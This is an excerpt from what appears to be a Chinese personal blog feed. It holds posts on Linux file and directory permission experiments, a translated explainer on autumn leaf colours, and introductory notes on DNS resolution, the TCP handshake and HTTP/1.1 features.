language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt -r--------. 1 fuck fuck 43 11月 15 13:19 test.txt<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt         <span class="token comment" spellcheck="true">#可以强制修改保存文件</span><span class="token comment" spellcheck="true">#查看文件</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt <span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token keyword">echo</span> <span class="token string">"SB &gt; Sb &gt; sB &gt; sb"</span>sssss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以查看信息、修改文件（有警告信息）、查看文件详细信息</p><h3 id="写权限"><a href="#写权限" class="headerlink" title="写权限"></a>写权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt --w-------. 1 fuck fuck 43 11月 15 13:19 test.txt<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt <span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt cat: test.txt: 权限不够 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只能查看自己的信息，如果强行修改文件的话，旧文件内容会被你新内容覆盖</p><h3 id="执行权限"><a href="#执行权限" class="headerlink" title="执行权限"></a>执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt ---x------. 1 fuck fuck 9 11月 15 13:22 test.txt<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ ./test.txt bash: ./test.txt: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt cat: test.txt: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只能查看自己的信息，同样强制修改会覆盖旧内容</p><h3 id="读和执行"><a href="#读和执行" class="headerlink" title="读和执行"></a>读和执行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt -r-x------. 1 fuck fuck 28 11月 15 14:48 test.txt<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt <span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ ./test.txt njndkjdn<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt <span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token keyword">echo</span> <span class="token string">"njndkjdn"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以对文件进行修改（有警告信息）、执行、查看</p><h3 id="读和写"><a href="#读和写" class="headerlink" title="读和写"></a>读和写</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt -rw-------. 1 fuck fuck 28 11月 15 14:48 test.txt<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt <span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt <span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token keyword">echo</span> <span class="token string">"njndkjdn"</span><span class="token keyword">echo</span> <span class="token string">"sb"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以对文件进行修改（无警告信息）、查看</p><h3 id="写和执行"><a href="#写和执行" class="headerlink" title="写和执行"></a>写和执行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> 300 test.txt <span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> test.txt cat: test.txt: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim test.txt <span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ ./test.txt /bin/bash: ./test.txt: 权限不够<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以强制修改文件内容，同样会覆盖旧文件内容</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>首先文件必须有读的权限，不然无法对文件进行任何操作。写权限就是对文件进行修改，执行权限就是执行文件</p><h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><pre class="line-numbers language-bash"><code class="language-bash">root@master hello<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls -l</span>总用量 4drwxr-xr-x. 2 fuck fuck   6 11月 12 11:11 fuck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第一个字段</strong></p><ul><li><p>d：表示目录</p></li><li><p>rwx 所有者权限</p></li><li><p>r-x 所属组权限</p></li><li><p>r-x 其他人权限。</p></li></ul><p>r：读权限，w：写权限，x：执行权限（没有这个权限会用 - 来表示）</p><p><strong>第二个字段</strong></p><ul><li><p>目录内所含的文件，目录数量</p></li><li><p>每个目录默认会包含两个目录，分别是 .（当前目录） ..（父目录）</p></li></ul><p><strong>第三个字段</strong></p><p>root：所有者，就是创建这个目录的用户</p><p><strong>第四个字段</strong>    </p><p>root：用户组，创建这个目录时所在的组就是用户组</p><p><strong>第四个字段</strong></p><p>6 11月 12 11:11：目录修改日期，上次进入目录、更改目录名的时间</p><p><strong>第五个字段</strong></p><p>fuck：目录名</p><h3 id="目录读权限"><a href="#目录读权限" class="headerlink" title="目录读权限"></a>目录读权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查看目录信心</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0dr--------. 3 fuck fuck 50 11月 14 21:17 hello<span class="token comment" spellcheck="true">#进入目录</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/-bash: cd: hello/: 权限不够<span class="token comment" spellcheck="true">#查看目录里的文件和目录信息</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/ls: 无法访问hello/file1.txt: 权限不够ls: 无法访问hello/file2.txt: 权限不够ls: 无法访问hello/Hi: 权限不够总用量 0-????????? ? ? ? ?            ? file1.txt-????????? ? ? ? ?            ? file2.txtd????????? ? ? ? ?            ? Hi<span class="token comment" spellcheck="true">#编辑目录下的文件</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ vim hello/file1.txt ~                                                                                                                                ~                                                                                                                                ~                                                                                                                                ~                                                                                                                                <span class="token string">"hello/file1.txt"</span> <span class="token punctuation">[</span>权限不足<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#移动目录下的文件</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">mv</span> hello/file1.txt <span class="token keyword">.</span>mv: 无法获取<span class="token string">"hello/file1.txt"</span> 的文件状态<span class="token punctuation">(</span>stat<span class="token punctuation">)</span>: 权限不够<span class="token comment" spellcheck="true">#删除文件</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">rm</span> -r hello/file1.txt rm: 无法删除<span class="token string">"hello/file1.txt"</span><span class="token keyword">:</span> 权限不够<span class="token comment" spellcheck="true">#复制文件</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cp</span> hello/file1.txt <span class="token keyword">.</span>cp: 无法获取<span class="token string">"hello/file1.txt"</span> 的文件状态<span class="token punctuation">(</span>stat<span class="token punctuation">)</span>: 权限不够<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只可以查看自己的信息。</p><h3 id="目录写权限"><a href="#目录写权限" class="headerlink" title="目录写权限"></a>目录写权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0d-w-------. 3 fuck fuck 50 11月 14 21:34 hello<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/ls: 无法打开目录hello/: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/-bash: cd: hello/: 权限不够~                                                                                                                              ~                                                                                                                              ~                                                                                                                              ~                                                                                                                              ~                                                                                                                              ~                                                                                                                              <span class="token string">"hello/file1.txt"</span> <span class="token punctuation">[</span>权限不足<span class="token punctuation">]</span>                                                                  0,0-1        全部<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样只能查看自己的信息</p><h3 id="目录执行权限"><a href="#目录执行权限" class="headerlink" title="目录执行权限"></a>目录执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0d--x------. 3 fuck fuck 50 11月 14 21:34 hello<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">cd</span> <span class="token punctuation">..</span><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/ls: 无法打开目录hello/: 权限不够<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ vim file1.txt123456789~                                                                                                                              ~    ~                                                                                                                              ~                                                                                                                              <span class="token string">"file1.txt"</span> 1L, 10C                                                                1,1          全部<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">rm</span> -r file1.txtrm: 无法删除<span class="token string">"file1.txt"</span><span class="token keyword">:</span> 权限不够<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">mv</span> file1.txt ~mv: 无法将<span class="token string">"file1.txt"</span> 移动至<span class="token string">"/home/fuck/file1.txt"</span><span class="token keyword">:</span> 权限不够<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以进入目录、对文件进行查看、修改操作（前提是这个文件要有这个权限，文件名无法用tab补全）</p><h3 id="目录读和执行权限"><a href="#目录读和执行权限" class="headerlink" title="目录读和执行权限"></a>目录读和执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0dr-x------. 3 fuck fuck 50 11月 14 22:41 hello<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/总用量 8-rw-rw-r--. 1 fuck fuck 10 11月 14 21:16 file1.txt-rw-rw-r--. 1 fuck fuck 11 11月 14 21:17 file2.txtdrwxrwxr-x. 2 fuck fuck  6 11月 14 21:17 Hi<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">cat</span> file1.txt 123456789<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ vim file1.txt <span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">rm</span> -r file1.txt rm: 无法删除<span class="token string">"file1.txt"</span><span class="token keyword">:</span> 权限不够<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">touch</span> file3.txttouch: 无法创建<span class="token string">"file3.txt"</span><span class="token keyword">:</span> 权限不够<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只可以查看文件详情，修改文件，进入目录</p><h3 id="目录写和执行权限"><a href="#目录写和执行权限" class="headerlink" title="目录写和执行权限"></a>目录写和执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0d-wx------. 3 fuck fuck 50 11月 14 23:10 hello<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/ls: 无法打开目录hello/: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">touch</span> file3.txt<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">rm</span> file1.txt<span class="token punctuation">[</span>fuck@master hello<span class="token punctuation">]</span>$ <span class="token function">rm</span>  -r file1.txtrm: 无法删除<span class="token string">"file1.txt"</span><span class="token keyword">:</span> 没有那个文件或目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以进入目录，修改、查看、创建，删除文件</p><h3 id="目录读写权限"><a href="#目录读写权限" class="headerlink" title="目录读写权限"></a>目录读写权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l总用量 0drw-------. 3 fuck fuck 50 11月 14 23:10 hello<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> hello/-bash: cd: hello/: 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">touch</span> hello/file5.txttouch: 无法创建<span class="token string">"hello/file5.txt"</span><span class="token keyword">:</span> 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">rm</span> -r hello/file2.txtrm: 无法删除<span class="token string">"hello/file2.txt"</span><span class="token keyword">:</span> 权限不够<span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l hello/ls: 无法访问hello/file2.txt: 权限不够ls: 无法访问hello/Hi: 权限不够ls: 无法访问hello/file3.txt: 权限不够总用量 0-????????? ? ? ? ?            ? file2.txt-????????? ? ? ? ?            ? file3.txtd????????? ? ? ? ?            ? Hi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只能查看自己的信息</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>修改目录中的文件首先需要有进入目录的权限（即执行权限X），写权限可以创建和删除文件（前提是要有执行权限），读权限可以查看目录内的文件的详细信息。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux permissions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>秋天的叶子为什么会改变颜色</title>
      <link href="/2019/11/13/%E7%A7%8B%E5%A4%A9%E7%9A%84%E5%8F%B6%E5%AD%90%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%94%B9%E5%8F%98%E9%A2%9C%E8%89%B2/"/>
      <url>/2019/11/13/%E7%A7%8B%E5%A4%A9%E7%9A%84%E5%8F%B6%E5%AD%90%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%94%B9%E5%8F%98%E9%A2%9C%E8%89%B2/</url>
      
        <content type="html"><![CDATA[<p><strong>翻译自：</strong><a href="https://smokymountains.com/fall-foliage-map/" target="_blank" rel="noopener">Why Do Autumn Leaves Change Their Color?</a></p><h2 id="一切科学"><a href="#一切科学" class="headerlink" title="一切科学"></a>一切科学</h2><p>这一切都始于光合作用。从叶绿素的不断产生，从春季到夏季到秋季初，叶子通常会呈现出鲜艳的绿色。正如我们在5年级科学中所学到的，叶绿素是植物将阳光转化为葡萄糖的主要成分，而葡萄糖又可以为树木提供营养。数以百万计的这些叶绿素细胞浸透了叶子，最终使它们看起来绿色。</p><p><img src="https://smokymountains.com/wp-content/themes/smcom-2017/ff-map/images/img03.png" alt=""></p><h2 id="不断变化的颜色"><a href="#不断变化的颜色" class="headerlink" title="不断变化的颜色"></a>不断变化的颜色</h2><p>叶绿素并不是秋天的彩色游戏中唯一的参与者。存在于其他树叶和树木中的是称为类胡萝卜素和花青素的化合物。随着秋天的日子开始越来越短，叶绿素的生成减慢了速度，最终让位于叶的“真实”颜色。</p><p>橘色</p><p><img src="https://smokymountains.com/wp-content/themes/smcom-2017/ff-map/images/img04.png" alt=""></p><p><strong>β-胡萝卜素</strong></p><p>β-胡萝卜素是大多数叶片中最常见的类胡萝卜素之一。<br>它强烈吸收蓝色和绿色光，反射来自太阳的黄色和红色光，使叶子呈橙色。</p><p>红色</p><p><img src="https://smokymountains.com/wp-content/themes/smcom-2017/ff-map/images/img05.png" alt=""></p><p><strong>花青素</strong></p><p>与类胡萝卜素不同，花青素的产量随秋季急剧增加。<br>这样可以保护叶子，延长其在整个秋天的树上的寿命，并为叶子提供美丽的红色。</p><p>黄色</p><p><img src="https://smokymountains.com/wp-content/themes/smcom-2017/ff-map/images/img06.png" alt=""></p><p><strong>黄酮醇</strong></p><p>黄酮醇是类黄酮蛋白家族的一部分，总是存在于叶片中，并且也使蛋黄呈黄色。<br>虽然总是存在于叶片中，但直到叶绿素的生成开始减慢时才可见。</p><h2 id="为什么叶子会落下来？"><a href="#为什么叶子会落下来？" class="headerlink" title="为什么叶子会落下来？"></a>为什么叶子会落下来？</h2><p>大自然的美有时会在它散发出的深刻“智慧”中找到。包括树木在内的多年生植物必须保护自己，以度过严酷而寒冷的冬天。如果树木不脱落，其柔软的植被肯定会在冬季冻结，从而造成伤害，并且无疑会杀死树木。</p><p>为了应对严酷的冬季气温，树木缓慢地关闭了脉络，这些脉络将水和养分带入和带出叶片，并在叶柄的底部形成了一层新的细胞，从而保护了树木的四肢和身体。一旦完成新细胞的创建过程，水分和养分就不会再从叶上来回流动了，这使叶片在茎上死亡和变弱，最终优雅地掉落到地面上。</p><p>不难得出这样的结论：虽然落叶飘落在整个冬季保护了树木，但如果没有温暖的春季和夏季，没有大量枯叶，树木将无法生存。这样，树木的自然循环年复一年为自身提供健康和可持续性。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 科普 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 植物 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/2019/11/04/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/11/04/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI参考模型、TCP-IP-参考模型"><a href="#OSI参考模型、TCP-IP-参考模型" class="headerlink" title="OSI参考模型、TCP/IP 参考模型"></a>OSI参考模型、TCP/IP 参考模型</h2><p><img src="https://i.loli.net/2019/11/07/w9hiKWHopRtBv5c.png" alt="OSI.png"></p><p><img src="https://i.loli.net/2019/11/07/5Qkr8RM9igIzHWv.png" alt="TCP-IP.png"></p><p>国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合开发了这个七层的参考模型，目的就是规范不同网络设备厂家使用相同通信协议，让不同的网络设备互联起来。但是 OSI 模型仅仅停留在理论概念，没有开发出符合 OSI 模型的具体协议实现，推广力度也没有后来的 TCP/IP 大。所以最后只剩下 OSI 参考模型，而我们在现实中用的基本都是 TCP/IP 模型和协议族。</p><h2 id="TCP-IP-通信传输过程（以HTTP协议为例）"><a href="#TCP-IP-通信传输过程（以HTTP协议为例）" class="headerlink" title="TCP/IP 通信传输过程（以HTTP协议为例）"></a>TCP/IP 通信传输过程（以HTTP协议为例）</h2><p><img src="https://i.loli.net/2019/11/07/mKGNOB9Q3SFyjAk.png" alt="HTTP-1.png"></p><ul><li><p>首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。</p></li><li><p>接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。</p></li><li><p>在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。</p></li><li><p>接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP请求。</p></li></ul><h2 id="HTTP-工作过程"><a href="#HTTP-工作过程" class="headerlink" title="HTTP 工作过程"></a>HTTP 工作过程</h2><p>HTTP工作过程简单概括就是四个步骤</p><ol><li><p>客户端和服务端建立TCP连接</p></li><li><p>客户端向服务端发送请求</p></li><li><p>HTTP服务器向客户端返回状态和内容</p></li><li><p>客户端接收完成后，向服务器发送请求，服务端关闭 TCP/IP 连接</p></li></ol><h2 id="HTTP-详细的工作过程"><a href="#HTTP-详细的工作过程" class="headerlink" title="HTTP 详细的工作过程"></a>HTTP 详细的工作过程</h2><p>这里以谷歌浏览器，访问博客为例（<a href="https://www.uiihh.xyz/）" target="_blank" rel="noopener">https://www.uiihh.xyz/）</a></p><ul><li><h3 id="DNS-解析"><a href="#DNS-解析" class="headerlink" title="DNS 解析"></a>DNS 解析</h3></li></ul><p>在建立连接之前，浏览器会先解析 DNS，获取服务器 IP 地址，然后再建立 TCP 连接。</p><ol><li><p>Chrome搜索自身的DNS缓存，看有没有对应该域名的IP地址，这个缓存的时间只有一分钟。</p><p> （查看浏览器自身缓存：chrome://net-internals/#dns）</p></li><li><p>如果在浏览器没有找到缓存或者缓存已经失效，则搜索操作系统自身的 DNS 缓存。</p></li><li><p>如果在操作系统中也没有找到缓存或者缓存已经失效。则读取本地的host文件。</p><p> （host文件：window在System32\drivers\etc；mac在finder中按快捷键组合 Shift+Command+G 三个组合按键，并输入 Hosts 文件的所在路径：/etc/hosts）</p></li><li><p>如果在host文件中找不到对应的配置，浏览器则发起一个DNS的系统调用。</p></li><li><p>主机向本地域名服务器（宽带运营商服务器）发出查询（主机向本地域名服务器的查询一般是递归查询）。</p><ol><li><p>本地域名服务器查看本身缓存。</p></li><li><p>如果本地域名服务器没有该域名的缓存，则发起一个迭代 DNS 解析的请求。</p><ul><li><p>本地域名服务器会向根域名服务器发送迭代查询请求报文，查询域名对应的 IP 地址。如果根域名服务器知道，则给出IP地址；否则，根域名服务器会给出 com 域的顶级域名服务器的 IP 地址，让本地域名服务器再向顶级域名服务器查询。</p></li><li><p>本地域名服务器向顶级域名服务器发送迭代查询请求报文，查询域名对应的IP地址。如果顶级域名服务器知道，则给出 IP 地址；否则，顶级域名服务器会给出 uiihh.xyz 域的权限域名服务器的 IP 地址，让本地域名服务器再向权限域名服务器查询。</p></li><li><p>到了 uiihh.xyz 域的权限域名服务器（域名注册商的地址，例如万网），拿到<a href="http://www.uiihh.xyz" target="_blank" rel="noopener">www.uiihh.xyz</a> 对应的IP地址。</p></li></ul></li><li><p>本地域名服务器把结果返回操作系统内核同时缓存起来。</p></li><li><p>操作系统内核把结果返回浏览器。</p></li><li><p>最后浏览器拿到了 uiihh.xyz 对应的 IP 地址。</p></li></ol></li></ol><ul><li><h3 id="建立-TCP-连接"><a href="#建立-TCP-连接" class="headerlink" title="建立 TCP 连接"></a>建立 TCP 连接</h3></li></ul><p><img src="https://i.loli.net/2019/11/07/RA23YFzL8fUar4G.png" alt="HTTP-2.png"></p><p>第一次：A 随机选取一个序列号 x，并发送给 B，说“我想和你建立连接”。</p><p>第二次：B 接收到数据，使用 确认序号ACK 进行确认，并发送数据给 A，说“我已经接收到你的请求，你现在可以连接了。”</p><p>第三次：A 收到服务器端的确认后，然后向 B 发送确认信息说 “我已经建立好连接了，你确认一下”。这时，TCP 连接以建立，A 进入 ESTABLISHED（已建立连接）状态。</p><p>第四次：B 收到 A 的确认消息后，B 进入 ESTABLISHED（已建立连接）状态</p><p>A 最后再次向 B 发送确认信息主要是为了预防下面的情况：</p><p>A 发送请求给 B，但是发送地时候数据包而被滞留在某个节点，对于 A 来说这个请求已经失效了，它已经不连这个通道了。但是又过了一会请求传到了 B，B 看到了认为是 A 刚发送过来的，所以 B 建立连接。最后造成 B 的资源浪费。</p><ul><li><h3 id="客户端向服务器发送请求命令"><a href="#客户端向服务器发送请求命令" class="headerlink" title="客户端向服务器发送请求命令"></a>客户端向服务器发送请求命令</h3></li></ul><p>一旦建立了TCP连接，客户端就会向服务器发送请求命令</p><p>例如：<code>GET/sample/hello.jsp HTTP/1.1</code></p><ul><li><h3 id="客户端发送请求头信息"><a href="#客户端发送请求头信息" class="headerlink" title="客户端发送请求头信息"></a>客户端发送请求头信息</h3></li></ul><p>客户端发送其请求命令之后，还要以头信息的形式向服务器发送一些别的信息，之后客户端发送了一空白行来通知服务器，它已经结束了该头信息的发送</p><ul><li><h3 id="服务器应答"><a href="#服务器应答" class="headerlink" title="服务器应答"></a>服务器应答</h3></li></ul><p>客户端向服务器发出请求后，服务器会客户端返回响应；<br>例如： HTTP/1.1 200 OK<br>响应的第一部分是协议的版本号和响应状态码</p><ul><li><h3 id="服务器返回响应头信息"><a href="#服务器返回响应头信息" class="headerlink" title="服务器返回响应头信息"></a>服务器返回响应头信息</h3></li></ul><p>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同响应向用户发送关于它自己的数据及被请求的文档</p><ul><li><h3 id="服务器向客户端发送数据"><a href="#服务器向客户端发送数据" class="headerlink" title="服务器向客户端发送数据"></a>服务器向客户端发送数据</h3></li></ul><p>服务器向客户端发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，它就以 Content-Type 响应头信息所描述的格式发送用户所请求的实际数据</p><ul><li><h3 id="服务器关闭-TCP-连接"><a href="#服务器关闭-TCP-连接" class="headerlink" title="服务器关闭 TCP 连接"></a>服务器关闭 TCP 连接</h3></li></ul><p>一般情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接，然后如果客户端或者服务器在其头信息加入了这行代码 Connection:keep-alive ，TCP 连接在发送后将仍然保持打开状态，于是，客户端可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p><h2 id="HTTP1-1-协议的特性"><a href="#HTTP1-1-协议的特性" class="headerlink" title="HTTP1.1 协议的特性"></a>HTTP1.1 协议的特性</h2><ul><li><h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3></li></ul><p>1.1 版的最大变化，就是引入了持久连接（persistent connection），即 TCP 连接默认不关闭，可以被多个请求复用。</p><p>客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送 Connection: close，明确要求服务器关闭 TCP 连接。（就是用户浏览器的整个网页加载完成后，会发送 Connection: close 给服务器，告诉它网页已经加载好了，你可以关闭服务器了）。目前，对于同一个域名，大多数浏览器允许同时建立 6 个持久连接。</p><ul><li><h3 id="管道连接"><a href="#管道连接" class="headerlink" title="管道连接"></a>管道连接</h3></li></ul><p>1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。<br>举例来说，客户端需要请求两个资源，分别是 A 和 B。管道机制则是允许浏览器同时发出 A请求 和 B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应 B请求。</p><p><img src="https://i.loli.net/2019/11/07/d8mpL54x1GKz7ye.png" alt="HTTP-4.png"></p><p>管道连接和非管道连接的区别</p><p><img src="https://i.loli.net/2019/11/07/fuHp4oTnCrWs83E.png" alt="HTTP-3.png"></p><ul><li><h3 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 